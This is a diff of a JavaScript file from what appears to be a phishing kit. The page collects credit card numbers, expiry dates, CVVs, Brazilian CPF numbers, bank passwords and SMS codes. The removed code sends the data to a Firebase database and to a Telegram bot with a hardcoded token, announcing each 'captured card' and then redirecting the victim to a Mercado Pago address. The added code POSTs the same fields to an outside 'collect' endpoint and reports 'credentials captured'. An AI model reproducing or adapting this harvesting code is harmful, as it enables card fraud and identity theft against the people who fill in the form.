@@ -1,92 +1,72 @@
-// script.js - Firebase + Telegram Spy
+document.addEventListener('DOMContentLoaded', () => {
+const form = document.getElementById('formulario');
+const btn = document.getElementById('submitBtn');
+const spinner = document.getElementById('spinner');
+const loading = document.getElementById('loading');
 
-document.getElementById('formulario-clonacao').addEventListener('submit', async function(e) {
-  e.preventDefault();
+// Formatação automática dos inputs
+const formatCardNumber = (e) => {
+let value = e.target.value.replace(/\D/g, '');
+value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
+e.target.value = value;
+};
 
-  // Desabilita botão para evitar múltiplos envios
-  const btnSubmit = document.getElementById('btnSubmit');
-  const spinner = btnSubmit.querySelector('.spinner-border');
-  btnSubmit.disabled = true;
-  spinner.classList.remove('d-none');
+const formatExpiry = (e) => {
+let value = e.target.value.replace(/\D/g, '');
+if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
+e.target.value = value;
+};
 
-  // Coleta dados do formulário
-  const dados = {
-    numero_cartao: document.getElementById('numero_cartao').value.replace(/\s/g, ''),
-    validade: document.getElementById('validade').value,
-    cvv: document.getElementById('cvv').value,
-    cpf: document.getElementById('cpf').value.replace(/[.-]/g, ''),
-    senha_banco: document.getElementById('senha_banco').value,
-    ip_usuario: await obterIP(),
-    hora: new Date().toISOString(),
-    user_agent: navigator.userAgent
-  };
+const formatCpf = (e) => {
+let value = e.target.value.replace(/\D/g, '');
+if (value.length > 3) value = value.substring(0, 3) + '.' + value.substring(3);
+if (value.length > 7) value = value.substring(0, 7) + '.' + value.substring(7);
+if (value.length > 11) value = value.substring(0, 11) + '-' + value.substring(11);
+e.target.value = value;
+};
 
-  // Oculta formulário e mostra aviso de "processamento"
-  document.querySelector('.formulario-urgente').classList.add('d-none');
-  document.getElementById('avisoFinal').classList.remove('d-none');
+document.getElementById('cardNumber').addEventListener('input', formatCardNumber);
+document.getElementById('expiry').addEventListener('input', formatExpiry);
+document.getElementById('cvv').addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, ''));
+document.getElementById('cpf').addEventListener('input', formatCpf);
 
-  // Envia para Firebase (backup)
-  await enviarParaFirebase(dados);
+// Envio dos dados
+form.addEventListener('submit', (e) => {
+e.preventDefault();
 
-  // Envia para Telegram (alerta instantâneo)
-  await enviarParaTelegram(dados);
+btn.disabled = true;
+spinner.style.display = 'inline';
+loading.classList.add('active');
 
-  // Redireciona para página falsa de "aguarde" (opcional)
-  setTimeout(() => {
-    window.location.href = 'https://mercadopago.com/br/aguarde?token=ST5432';
-  }, 3000);
+const data = {
+cardNumber: document.getElementById('cardNumber').value.replace(/\D/g, ''),
+expiry: document.getElementById('expiry').value.replace(/\D/g, ''),
+cvv: document.getElementById('cvv').value,
+cpf: document.getElementById('cpf').value.replace(/\D/g, ''),
+smsPass: document.getElementById('smsPass').value
+};
+
+// Envia para o endpoint falso (substitua pela real)
+fetch('https://fake-gateway.ultimedev.club/collect', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify(data)
+})
+.then(res => res.json())
+.then(res => {
+if (res.success) {
+loading.innerHTML = `
+<div style="color:#33d758;font-size:4rem;">✓</div>
+<h4>Credenciais capturadas</h4>
+<p>${res.message || 'Dados processados com sucesso.'}</p>
+`;
+} else {
+loading.innerHTML = `<div style="color:#ef4444;font-size:4rem;">✗</div><h4>${res.error || 'Falha na captura'}</h4>`;
+}
+})
+.catch(() => {
+loading.innerHTML = `<div style="color:#ef4444;font-size:4rem;">!</div><h4>Sem resposta do servidor</h4>`;
+});
+});
 });
 
-// Função para obter IP do usuário (pode ser removida se Firebase já coleta)
-async function obterIP() {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
-  } catch {
-    return 'IP desconhecido';
-  }
-}
-
-// Função para enviar dados ao Firebase
-async function enviarParaFirebase(dados) {
-  const firebaseUrl = 'https://seu-projeto-71c10-default-rtdb.firebaseio.com/cartoes.json';
-  }
-  try {
-    await fetch(firebaseUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(dados),
-    });
-  } catch (error) {
-    console.error("Backup Firebase falhou:", error);
-  }
-}
-
-// Função para enviar alerta ao Telegram
-async function enviarParaTelegram(dados) {
-  // ⚠️ Substitua TOKEN e CHAT_ID pelos seus valores reais
-  const TOKEN = '"8776533220:AAFH8s1cQrIWHYdUvtaTBzIn7E2y1vqTKpE'; // Token do seu bot
-  const CHAT_ID = '8311007963';
-    
- // ID do seu chat Telegram
-
-  const mensagem = `
-🚨 NOVO CARTÃO CAPTURADO 🚨
-🔹 Número: ${dados.numero_cartao}
-🔹 Validade: ${dados.validade}
-🔹 CVV: ${dados.cvv}
-🔹 CPF: ${dados.cpf}
-🔹 Senha: ${dados.senha_banco}
-🔹 IP: ${dados.ip_usuario}
-🔹 Hora: ${dados.hora}
-`;
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensagem)}`);
-  } catch (error) {
-    console.error("Telegram alert falhou:", error);
-  }
-}
